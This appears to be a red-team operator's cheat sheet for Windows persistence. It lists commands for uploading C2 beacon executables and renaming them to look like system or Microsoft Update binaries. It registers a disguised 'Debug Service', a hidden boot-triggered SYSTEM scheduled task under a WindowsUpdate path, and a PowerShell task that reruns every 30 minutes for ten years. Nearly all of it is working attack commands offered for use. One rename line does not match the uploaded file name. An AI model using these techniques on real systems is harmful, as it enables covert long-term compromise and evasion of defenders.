##### Windows service
```powershell
cd C:\Windows\System32\
upload C:\Payloads\http_x64.svc.exe
mv http_x64.svc.exe debug_svc.exe
```

```powershell
sc_create dbgsvc "Debug Service" C:\Windows\System32\debug_svc.exe "Windows Debug Service" 0 2 3
```

```powershell
sc_qc dbgsvc
```

Cleanup
```powershell
sc_delete dbgsvc
```

##### Scheduled Task
```xml
<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
<Triggers>
    <BootTrigger>
        <Enabled>true</Enabled>
    </BootTrigger>
</Triggers>
<Principals>
    <Principal>
        <UserId>NT AUTHORITY\SYSTEM</UserId>
        <RunLevel>HighestAvailable</RunLevel>
    </Principal>
</Principals>
<Settings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
</Settings>
<Actions>
    <Exec>
        <Command>"C:\Program Files\Microsoft Update Health Tools\updater.exe"</Command>
    </Exec>
</Actions>
</Task>
```

```powershell
cd C:\Program Files\Microsoft Update Health Tools
upload C:\Payloads\dns_x64.svc.exe
mv dns_x64.exe updater.exe
```

```powershell
schtaskscreate \Microsoft\Windows\WindowsUpdate\Updater XML CREATE
```

Cleanup
```powershell
schtasksdelete \Microsoft\Windows\WindowsUpdate\Updater TASK
```

##### Adaptix
```powershell
upload ~/beacons/svc_https.x64.exe "C:\Program Files\Microsoft Update Health Tools\updater.exe"
```

```powershell
powershell "Register-ScheduledTask -TaskName 'Microsoft Updater x64' -Action (New-ScheduledTaskAction -Execute 'C:\Program Files\Microsoft Update Health Tools\updater.exe') -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 30) -RepetitionDuration (New-TimeSpan -Days 3650)) -Description 'Checks for Windows Updates'"
```